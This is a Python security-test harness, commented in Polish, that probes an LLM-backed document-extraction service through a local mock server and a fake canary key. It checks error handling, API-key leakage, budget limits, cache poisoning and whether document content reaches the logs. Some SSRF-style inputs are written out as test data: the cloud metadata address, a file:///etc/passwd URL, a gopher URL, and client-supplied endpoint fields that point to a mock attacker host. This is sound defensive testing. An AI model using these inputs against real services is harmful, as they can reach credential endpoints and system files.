"""E14: awarie LLM/OCR, wyciek klucza-kanarka, SSRF przez konfigurację, budżet LLM, zatrucie cache, treść dokumentu w logach.

Wszystko na atrapie HTTP (MockServer) i fikcyjnym kluczu-kanarku: zero płatnych wywołań, zero prawdziwego klucza.
Uruchomienie: .venv-exp/bin/python experiments/2026-11-21-wybor-modulow/atak/E14/e14.py [--only matrix,leak,ssrf,budget,cache,doclog]
Wynik: atak/E14/wyniki.json. Wynik opisuje UPRZĄŻ, nie produkt.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from lib import *  # noqa: F401,F403
import lib  # noqa: F401

EXPN = "E14"
WORK = SANDBOX / EXPN
CANARY = "CANARY-KEY-" + secrets.token_hex(12)
DOC_CANARY = "PESEL-CANARY-" + secrets.token_hex(6)


class Mode:
    """Zmienny tryb atrapy: wybierany przed każdym przypadkiem."""

    def __init__(self) -> None:
        self.kind = "ok"
        self.sleep = 0.0
        self.calls = 0

    def handler(self, req: MockReq) -> None:
        self.calls += 1
        k = self.kind
        leak_body = json.dumps({"error": {"message": f"invalid x-api-key {CANARY}", "echo_auth": req.headers.get("Authorization", ""), "echo_xkey": req.headers.get("x-api-key", "")}}).encode()
        if k == "ok":
            req.anthropic_ok(json.dumps({"fields": [{"field": "/przelew_bankowy/kwota", "value": 123.45, "quote": "123,45", "page": 1}]}))
        elif k in ("401", "403"):
            req.send(int(k), leak_body, {"x-echo-key": CANARY})
        elif k == "429":
            req.send(429, leak_body, {"Retry-After": "3600", "x-echo-key": CANARY})
        elif k == "500":
            req.send(500, leak_body)
        elif k == "400_echo":
            req.send(400, leak_body)
        elif k == "hang":
            time.sleep(self.sleep)
            req.anthropic_ok("{}")
        elif k == "truncated":
            req.anthropic_ok('{"fields": [{"field": "/przelew_bankowy/kwota", "value": 12')
        elif k == "garbage":
            req.send(200, b"<html>" + CANARY.encode() + b"</html>", ctype="text/html")
        elif k == "empty":
            req.anthropic_ok("")
        elif k == "no_content":
            req.send(200, json.dumps({"id": "m"}).encode())
        elif k == "array":
            req.anthropic_ok('[{"field": "x"}]')
        elif k == "fields_not_list":
            req.anthropic_ok('{"fields": "nie lista"}')
        elif k == "item_no_value":
            req.anthropic_ok('{"fields": [{"field": "/przelew_bankowy/kwota"}]}')
        elif k == "redirect":
            req.send(302, b"", {"Location": "http://127.0.0.1:1/przekierowanie"})
        elif k == "stream_giant":
            req.anthropic_ok(json.dumps({"fields": []}) + " " * 1_000)
        else:
            req.send(418, b"?")


def new_srv(mode: Mode, name: str, kf: Path, *, llm: dict[str, Any] | None = None, router: str = "rules", **cfg: Any):
    mock = MockServer(mode.handler, canary_key=CANARY)
    mock.__enter__()
    ll = {"protocol": "anthropic", "base_url": mock.url + "/v1/messages", "key_file": str(kf), "retries": 2, "timeout_s": 4} | (llm or {})
    return mock, running(name, WORK / name, router=router, extractor="llm", llm=ll, **cfg)


def collect_http_texts(c: HarnessClient, doc_ids: list[str], artifacts: bool = True) -> str:
    """Wszystkie odpowiedzi HTTP po awarii (także /system, /openapi.json, 404, 422) do przeszukania pod kątem kanarka."""
    texts = []
    for p in ("/health", "/system", "/openapi.json", "/docs", "/documents/nie-ma", "/batches/nie-ma"):
        with contextlib.suppress(httpx.HTTPError):
            texts.append(c.http.get(p).text)
    with contextlib.suppress(httpx.HTTPError):
        texts.append(c.http.post("/batches", content=b"zly", headers={"Content-Type": "multipart/form-data; boundary=x"}).text)
    for d in doc_ids:
        paths = [f"/documents/{d}", f"/documents/{d}/report", f"/documents/{d}/metrics"]
        if artifacts:
            paths += [f"/documents/{d}/result", f"/documents/{d}/evidence", f"/documents/{d}/diagnosis", f"/documents/{d}/artifact/raw/reading.json", f"/documents/{d}/artifact/t3/ai-response.json"]
        for p in paths:
            with contextlib.suppress(httpx.HTTPError):
                texts.append(c.http.get(p).text)
    return "\n".join(texts)


def leak_scan(srv: Any, c: HarnessClient, doc_ids: list[str], needles: list[str], artifacts: bool = True) -> dict[str, Any]:
    http_text = collect_http_texts(c, doc_ids, artifacts)
    log_text = srv.log.read_text(errors="replace") if srv.log.exists() else ""  # type: ignore[attr-defined]
    return {"http": [n[:8] + "…" for n in needles if n in http_text],
            "server_log": [n[:8] + "…" for n in needles if n in log_text],
            "disk": grep_tree(srv.work, needles)}  # type: ignore[attr-defined]


# ===================================================================== matrix
CASES = [
    # id, nazwa, tryb, ustawienia llm, oczekiwany kod
    ("A01", "401 z kanarkiem w treści i nagłówku", "401", {}, "llm_authorization"),
    ("A02", "403 z kanarkiem", "403", {}, "llm_authorization"),
    ("A03", "429 z Retry-After: 3600 i kanarkiem", "429", {}, "llm_rate_limit"),
    ("A04", "500 z kanarkiem w treści", "500", {}, "llm_unavailable"),
    ("A05", "400 z echem nagłówków autoryzacji w treści", "400_echo", {}, "llm_invalid_response"),
    ("A06", "timeout (serwer milczy 8 s, limit 2 s, 1 ponowienie)", "hang", {"timeout_s": 2, "retries": 1}, "llm_unavailable"),
    ("A07", "urwany JSON (stop_reason max_tokens)", "truncated", {}, "llm_invalid_response"),
    ("A08", "ciało nie-JSON (HTML z kanarkiem)", "garbage", {}, "llm_invalid_response"),
    ("A09", "pusta odpowiedź modelu", "empty", {}, "llm_invalid_response"),
    ("A10", "odpowiedź bez pola content", "no_content", {}, "llm_invalid_response"),
    ("A11", "JSON będący tablicą", "array", {}, "llm_invalid_response"),
    ("A12", "pole fields nie jest listą", "fields_not_list", {}, "llm_invalid_response"),
    ("A13", "element fields[] bez value", "item_no_value", {}, "llm_invalid_response"),
    ("A14", "przekierowanie 302 do innego hosta", "redirect", {}, "llm_invalid_response"),
]


def g_matrix(kf: Path) -> list[dict[str, Any]]:
    recs: list[dict[str, Any]] = []
    pdf = dev_pdf("przelew", 0)
    for vid, name, kind, llm, expect in CASES:
        mode = Mode()
        mode.kind = kind
        mode.sleep = 8
        mock, ctx = new_srv(mode, f"m-{vid}", kf, llm=llm)
        try:
            with ctx as (srv, c):
                t0 = time.monotonic()
                st = upload_and_wait(c, pdf, "a.pdf", 120)
                wall = time.monotonic() - t0
                did = st["_document_id"]
                rr = c.http.get(f"/documents/{did}/result")
                leak = leak_scan(srv, c, [did], [CANARY])
                errs = st.get("errors") or []
                got = (st.get("codes") or [None])[0]
                ok_code = got == expect
                no_fake = rr.status_code == 409 and st.get("outcome") == "technical_error"
                leaked = bool(leak["http"] or leak["server_log"] or leak["disk"])
                cm = len(mock.log)
                canary_sent = any(x["auth_is_canary"] or x["xkey_is_canary"] for x in mock.log)
                gap = "tak" if (leaked or not no_fake) else ("częściowo" if not ok_code else "nie")
                recs.append(vec(vid, "awaria-LLM", name, f"outcome technical_error, kod {expect}, brak wyniku (GET /result 409), kanarek nieobecny w HTTP/logach/dysku, bez zmyślonych danych",
                                f"outcome={st.get('outcome')} kod={got} (zgodny={ok_code}); GET /result → {rr.status_code}; wywołań LLM={cm}; czas {wall:.1f} s; kanarek w odpowiedziach HTTP/logu/dysku: {leak['http'] or '-'}/{leak['server_log'] or '-'}/{[d['file'] for d in leak['disk']] or '-'}; opis błędu: {[e['description'][:60] for e in errs]}",
                                gap,
                                fix="Mapować błąd dostawcy tylko na kod i status HTTP (jak teraz), nigdy nie kopiować treści odpowiedzi; Retry-After uwzględniać z górnym limitem (np. 30 s); test kanarka dla każdej klasy błędu.",
                                port_test=f"test_llm_failure_{vid.lower()}_maps_to_code_and_leaks_nothing",
                                data={"wall_s": round(wall, 2), "llm_calls": cm, "state": {k: st.get(k) for k in ("outcome", "codes", "stage")}, "errors": errs,
                                      "leak": leak, "canary_sent_to_mock_as_auth": canary_sent}))
        finally:
            mock.__exit__()
    return recs


# ===================================================================== brak sieci / TLS / DNS / schematy URL
def g_net(kf: Path) -> list[dict[str, Any]]:
    recs: list[dict[str, Any]] = []
    pdf = dev_pdf("przelew", 0)
    mode = Mode()
    mock = MockServer(mode.handler, canary_key=CANARY)
    mock.__enter__()
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        dead = s.getsockname()[1]
    cases = [
        ("N01", "brak sieci: połączenie odrzucone (zamknięty port)", f"http://127.0.0.1:{dead}/v1/messages", "llm_unavailable"),
        ("N02", "błąd TLS: https do serwera HTTP", f"https://127.0.0.1:{mock.port}/v1/messages", "llm_unavailable"),
        ("N03", "DNS: nieistniejąca domena (.invalid)", "http://llm.nieistnieje.invalid/v1/messages", "llm_unavailable"),
        ("N04", "SSRF przez konfigurację: adres metadanych 169.254.169.254", "http://169.254.169.254/latest/meta-data/", "llm_unavailable"),
        ("N05", "schemat file://", "file:///etc/passwd", "llm_unavailable"),
        ("N06", "schemat gopher://", "gopher://127.0.0.1:70/_x", "llm_unavailable"),
    ]
    try:
        for vid, name, url, expect in cases:
            with running(f"net-{vid}", WORK / f"net-{vid}", router="rules", extractor="llm",
                         llm={"protocol": "anthropic", "base_url": url, "key_file": str(kf), "retries": 0, "timeout_s": 3}) as (srv, c):
                t0 = time.monotonic()
                st = upload_and_wait(c, pdf, "a.pdf", 60)
                wall = time.monotonic() - t0
                leak = leak_scan(srv, c, [st["_document_id"]], [CANARY])
                got = (st.get("codes") or [None])[0]
                leaked = bool(leak["http"] or leak["server_log"] or leak["disk"])
                alive = srv.alive()
                recs.append(vec(vid, "awaria-sieci/SSRF-konfiguracja", name, f"technical_error {expect}; serwer żyje; brak klucza w odpowiedziach",
                                f"outcome={st.get('outcome')} kod={got}; czas {wall:.1f} s; serwer żyje={alive}; wyciek kanarka={leaked}",
                                "tak" if (leaked or not alive or st.get("outcome") != "technical_error") else ("częściowo" if got != expect else "nie"),
                                fix="Walidować `base_url` przy starcie: schemat https (http tylko dla loopback w trybie deweloperskim), allowlista hostów (api.minimax.io) i odrzucenie adresów link-local/prywatnych poza loopback; test z mock.",
                                port_test=f"test_llm_base_url_validation_{vid.lower()}",
                                data={"wall_s": round(wall, 2), "state": {k: st.get(k) for k in ("outcome", "codes")}}))
    finally:
        mock.__exit__()
    return recs


# ===================================================================== wyciek klucza: klucz do obcego hosta, parametry żądania
def g_ssrf_cfg(kf: Path) -> list[dict[str, Any]]:
    recs: list[dict[str, Any]] = []
    pdf = dev_pdf("przelew", 0)
    # S01: czy jakakolwiek trasa przyjmuje URL/endpoint/model od klienta HTTP? Wysyłamy próby w polach i zapytaniach.
    mode = Mode()
    mode.kind = "ok"
    evil_hits = Mode()
    evil = MockServer(evil_hits.handler, canary_key=CANARY)
    evil.__enter__()
    mock = MockServer(mode.handler, canary_key=CANARY)
    mock.__enter__()
    try:
        with running("cfg-api", WORK / "cfg-api", router="rules", extractor="llm",
                     llm={"protocol": "anthropic", "base_url": mock.url + "/v1/messages", "key_file": str(kf), "retries": 0}) as (srv, c):
            before_evil = len(evil.log)
            files = [("files", ("a.pdf", pdf, "application/pdf"))]
            data = {"llm_base_url": evil.url, "base_url": evil.url, "endpoint": evil.url, "model": "x", "ODWOLANIA2JSON_ENDPOINT": evil.url, "input_path": "/etc/passwd", "key_file": "/etc/passwd"}
            r = c.http.post(f"/batches?base_url={evil.url}&endpoint={evil.url}&model=x", files=files, data=data, headers={"X-LLM-Endpoint": evil.url, "X-Base-Url": evil.url})
            st = doc_state(c, r.json()["document_id"], 60) if r.status_code == 201 else {}
            sysj = c.http.get("/system").json()
            recs.append(vec("C01", "SSRF-konfiguracja", "URL/endpoint/model/ścieżka podane przez klienta HTTP (pola formularza, zapytanie, nagłówki)", "parametry ignorowane lub odrzucone; zero połączeń do obcego hosta",
                            f"HTTP {r.status_code}; outcome={st.get('outcome')}; połączenia do obcego hosta: {len(evil.log) - before_evil}; LLM użył skonfigurowanego endpointu: {len(mock.log)} żądań; pola nadmiarowe przyjęte bez błędu (brak jawnej odmowy)",
                            "częściowo" if r.status_code == 201 and len(evil.log) == before_evil else ("tak" if len(evil.log) > before_evil else "nie"),
                            fix="Odrzucać nieznane pola formularza kodem 422 `unknown_field`; endpoint/model/klucz wyłącznie z konfiguracji uruchomienia.",
                            port_test="test_client_supplied_endpoint_fields_are_rejected_or_ignored_and_no_outbound_call"))
            recs.append(vec("C02", "wyciek-klucza", "klucz LLM wysyłany do endpointu z konfiguracji bez walidacji hosta (obcy host bez TLS)", "klucz wysyłany tylko do zaufanego hosta po TLS",
                            f"atrapa pod http://127.0.0.1 otrzymała nagłówki autoryzacji z kanarkiem: Authorization={any(x['auth_is_canary'] for x in mock.log)}, x-api-key={any(x['xkey_is_canary'] for x in mock.log)} (klucz wysyłany podwójnie, w obu nagłówkach, w jawnym HTTP)",
                            "tak" if any(x["auth_is_canary"] for x in mock.log) else "nie",
                            fix="Allowlista hosta i wymuszenie https; jeden nagłówek zależnie od protokołu (Anthropic: x-api-key; OpenAI: Authorization), nie oba.",
                            port_test="test_api_key_only_sent_to_allowlisted_https_host_in_single_header"))
            # C03: przekierowanie 302 nie niesie klucza do drugiego hosta
            mode.kind = "redirect"
        with running("cfg-redirect", WORK / "cfg-redirect", router="rules", extractor="llm",
                     llm={"protocol": "anthropic", "base_url": mock.url + "/v1/messages", "key_file": str(kf), "retries": 0}) as (srv2, c2):
            evil2 = Mode()
            evil_srv = MockServer(evil2.handler, canary_key=CANARY)
            with evil_srv:
                class R(Mode):
                    def handler(self, req: MockReq) -> None:  # noqa: D102
                        req.send(302, b"", {"Location": evil_srv.url + "/steal"})
                mock_r = MockServer(R().handler, canary_key=CANARY)
                with mock_r:
                    with running("cfg-redirect2", WORK / "cfg-redirect2", router="rules", extractor="llm",
                                 llm={"protocol": "anthropic", "base_url": mock_r.url + "/v1/messages", "key_file": str(kf), "retries": 0}) as (srv3, c3):
                        st = upload_and_wait(c3, pdf, "a.pdf", 60)
                    followed = len(evil_srv.log)
                    got_key = any(x["auth_is_canary"] or x["xkey_is_canary"] for x in evil_srv.log)
            recs.append(vec("C03", "wyciek-klucza", "odpowiedź 302 z endpointu LLM wskazująca na inny host", "przekierowanie nie jest śledzone; klucz nie trafia do drugiego hosta",
                            f"outcome={st.get('outcome')} kod={(st.get('codes') or [None])[0]}; żądań do drugiego hosta: {followed}; klucz u drugiego hosta: {got_key}",
                            "tak" if got_key else "nie",
                            fix="Utrzymać `follow_redirects=False` (domyślne w httpx) i dodać test regresji.", port_test="test_llm_client_does_not_follow_redirects"))
    finally:
        mock.__exit__()
        evil.__exit__()
    return recs


# ===================================================================== budżet LLM
def g_budget(kf: Path) -> list[dict[str, Any]]:
    recs: list[dict[str, Any]] = []
    pdf = dev_pdf("przelew", 0)
    # B01: 429 z Retry-After 3600: ile trwa i ile prób
    mode = Mode()
    mode.kind = "429"
    mock, ctx = new_srv(mode, "b-ra", kf, llm={"retries": 2})
    with ctx as (srv, c):
        t0 = time.monotonic()
        st = upload_and_wait(c, pdf, "a.pdf", 120)
        wall = time.monotonic() - t0
        recs.append(vec("L01", "budżet-LLM", "429 z Retry-After: 3600", "brak godzinnego wiszenia; ograniczona liczba prób; po limicie technical_error",
                        f"czas {wall:.1f} s; żądań do LLM={len(mock.log)} (retries=2 ⇒ max 3); outcome={st.get('outcome')} kod={(st.get('codes') or [None])[0]}; nagłówek Retry-After ignorowany (stały backoff 1 s, 2 s)",
                        "nie", fix="Opcjonalnie respektować Retry-After do górnego limitu (np. 30 s) i przerywać wsad po serii 429 (circuit breaker).",
                        port_test="test_retry_after_is_capped_and_attempts_are_bounded", data={"wall_s": round(wall, 1), "calls": len(mock.log)}))
    mock.__exit__()
    # B02: wsad N dokumentów przy trwałym 500: brak ogranicznika (circuit breaker) łącznej liczby wywołań
    mode = Mode()
    mode.kind = "500"
    mock, ctx = new_srv(mode, "b-batch500", kf, llm={"retries": 2}, limits={"max_workers": 4})
    n_docs = 20
    with ctx as (srv, c):
        t0 = time.monotonic()
        r = c.http.post("/batches", files=[("files", (f"{i}.pdf", pdf, "application/pdf")) for i in range(n_docs)])
        j = wait_batch(c, r.json()["batch_id"], 300)
        wall = time.monotonic() - t0
        recs.append(vec("L02", "budżet-LLM", f"wsad {n_docs} dokumentów przy trwałym błędzie 500 dostawcy", "twardy limit wywołań na wsad / wyłącznik po serii błędów; brak setek bezcelowych wywołań",
                        f"czas {wall:.1f} s; wywołań LLM={len(mock.log)} (= {n_docs} × 3 prób; bez wyłącznika serii błędów); wszystkie dokumenty technical_error={sum(1 for d in j['documents'] if d['outcome'] == 'technical_error')}",
                        "tak" if len(mock.log) >= n_docs * 3 else "nie",
                        fix="Licznik wywołań i tokenów na wsad (twardy limit z konfiguracji) oraz circuit breaker po K kolejnych błędach dostawcy ⇒ reszta wsadu `technical_error` bez wywołań.",
                        port_test="test_batch_stops_calling_llm_after_consecutive_provider_failures",
                        data={"wall_s": round(wall, 1), "calls": len(mock.log), "docs": n_docs}))
    mock.__exit__()
    # B03: duży dokument: ile tekstu trafia do jednego wywołania (brak context_limit)
    mode = Mode()
    mode.kind = "ok"
    mock, ctx = new_srv(mode, "b-big", kf, llm={"retries": 0}, limits={"max_pages": 60})
    
    big = dense_pdf(60, 16000, head=["POLECENIE PRZELEWU", "Potwierdzenie realizacji polecenia przelewu", "Rachunek obciazany", "Kwota 123,45 PLN"])
    with ctx as (srv, c):
        before = len(mock.log)
        st = upload_and_wait(c, big, "duzy.pdf", 180)
        body_len = mock.log[-1]["body_len"] if len(mock.log) > before else 0
        recs.append(vec("L03", "budżet-LLM", "dokument 60 stron gęstego tekstu (≈16 tys. znaków na stronę) (limit stron uprzęży 60): rozmiar jednego żądania do LLM", "limit kontekstu/tokenów na dokument (kod `context_limit`) przed wysłaniem",
                        f"outcome={st.get('outcome')} kod={(st.get('codes') or [None])[0]}; wywołań={len(mock.log) - before}; rozmiar żądania do LLM={body_len / 1e6:.2f} MB (≈{body_len // 4:,} tokenów szac.) bez sprawdzenia limitu kontekstu".replace(",", " "),
                        "tak" if body_len > 400_000 else "nie",
                        fix="Przed wywołaniem szacować tokeny i odrzucać/dzielić powyżej limitu (kod `context_limit`, architektura §6); osobny limit tokenów na dokument i wsad.",
                        port_test="test_oversized_document_text_yields_context_limit_without_llm_call", data={"body_len": body_len}))
    mock.__exit__()
    return recs


# ===================================================================== cache: zatrucie / podmiana wyniku
def g_cache(kf: Path) -> list[dict[str, Any]]:
    recs: list[dict[str, Any]] = []
    pdf = dev_pdf("przelew", 0)
    mode = Mode()
    mock, ctx = new_srv(mode, "c-cache", kf, llm={"retries": 0})
    with ctx as (srv, c):
        mode.kind = "ok"
        s1 = upload_and_wait(c, pdf, "a.pdf", 60)
        r1 = c.http.get(f"/documents/{s1['_document_id']}/result").json()
        calls1 = len(mock.log)
        s2 = upload_and_wait(c, pdf, "inna-nazwa.pdf", 60)
        calls2 = len(mock.log)
        mode.kind = "500"
        s3 = upload_and_wait(c, pdf, "a.pdf", 60)
        rr3 = c.http.get(f"/documents/{s3['_document_id']}/result")
        mode.kind = "ok"
        s4 = upload_and_wait(c, pdf, "a.pdf", 60)
        stale = rr3.status_code == 200
        recs.append(vec("K01", "cache", "ten sam SHA-256, awaria API przy drugim wgraniu: czy wraca stary wynik (ADR-002 pkt 12)", "technical_error bez podmiany starym wynikiem z cache",
                        f"1. wgranie: {s1['outcome']} ({calls1} wywołanie LLM); to samo pod inną nazwą: przeliczone ponownie (+{calls2 - calls1} wywołanie ⇒ brak cache po SHA); 3. wgranie przy 500: outcome={s3['outcome']}, GET /result → {rr3.status_code}; stary wynik podmieniony: {stale}",
                        "nie" if not stale else "tak",
                        fix="Przy dodaniu cache klucz = SHA-256 + wersja promptu + model + konfiguracja OCR; test z awarią API po trafieniu w cache; cache nigdy nie maskuje bieżącego błędu.",
                        port_test="test_provider_failure_after_cached_success_returns_technical_error_not_stale_result",
                        data={"states": [s1["outcome"], s2["outcome"], s3["outcome"], s4["outcome"]], "calls": [calls1, calls2]}))
    mock.__exit__()
    return recs


# ===================================================================== treść dokumentu w logach i błędach
def g_doclog(kf: Path) -> list[dict[str, Any]]:
    
    recs: list[dict[str, Any]] = []
    pdf = text_pdf_lines(["POLECENIE PRZELEWU", f"PESEL {DOC_CANARY}", "Kwota 123,45 PLN"])
    mode = Mode()
    for kind in ("500", "truncated", "garbage", "401"):
        mode.kind = kind
        mock, ctx = new_srv(mode, f"d-{kind}", kf, llm={"retries": 0})
        with ctx as (srv, c):
            st = upload_and_wait(c, pdf, "a.pdf", 60)
            leak = leak_scan(srv, c, [st["_document_id"]], [DOC_CANARY], artifacts=False)
            # 422 z treścią: pydantic domyślnie zwraca `input`
            r = c.http.post("/batches", files=[("wrongfield", ("a.pdf", pdf, "application/pdf"))])
            body_leak = DOC_CANARY in r.text
            http_bodies_with_doc = [p for p, n in (("http", leak["http"]),) if n]
            recs.append(vec(f"D0{['500', 'truncated', 'garbage', '401'].index(kind) + 1}", "treść-dokumentu-w-logach", f"błąd LLM `{kind}`: czy treść dokumentu (PESEL-kanarek) trafia do logu serwera, odpowiedzi błędu 422 lub artefaktów",
                            "w logach i błędach brak treści dokumentu; artefakt `reading.json` i `ai-response.json` zawierają ją z konieczności (dane, nie diagnostyka)",
                            f"log serwera: {leak['server_log'] or 'czysto'}; odpowiedzi HTTP bez tras artefaktów danych (stan, /report, /metrics, /system, błędy 404/422): {leak['http'] or 'czysto'}; 422 zawiera treść: {body_leak}; na dysku w: {sorted({d['file'].split('/')[-1] for d in leak['disk']})}",
                            "nie" if not leak["server_log"] and not body_leak else "tak",
                            fix="Rozróżnić artefakty danych (dozwolone, w katalogu roboczym) od logów/błędów (zakaz treści); test kanarka w CI na logach.",
                            port_test="test_document_content_never_appears_in_logs_or_error_bodies",
                            data={"leak": leak, "http_422_status": r.status_code}))
        mock.__exit__()
    return recs


GROUPS = {"matrix": g_matrix, "net": g_net, "ssrf": g_ssrf_cfg, "budget": g_budget, "cache": g_cache, "doclog": g_doclog}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", default="")
    ns = ap.parse_args()
    only = {x for x in ns.only.split(",") if x}
    kf = make_key_file(WORK / "key", CANARY)
    out_path = ATAK / EXPN / "wyniki.json"
    out = json.loads(out_path.read_text()) if out_path.exists() and only else {"experiment": EXPN, "versions": versions(), "vectors": [],
                                                                              "note": "Atrapa HTTP i klucz-kanarek; wynik opisuje uprząż, nie produkt. Zero prawdziwych wywołań LLM."}
    for g, fn in GROUPS.items():
        if only and g not in only:
            continue
        t0 = time.monotonic()
        print("==", g, flush=True)
        recs = fn(kf)
        for r in recs:
            out["vectors"] = [v for v in out["vectors"] if v["id"] != r["id"]] + [r]
        out["vectors"].sort(key=lambda v: v["id"])
        out_path.write_text(json.dumps(out, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"   {g}: {len(recs)} w {time.monotonic() - t0:.1f} s", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
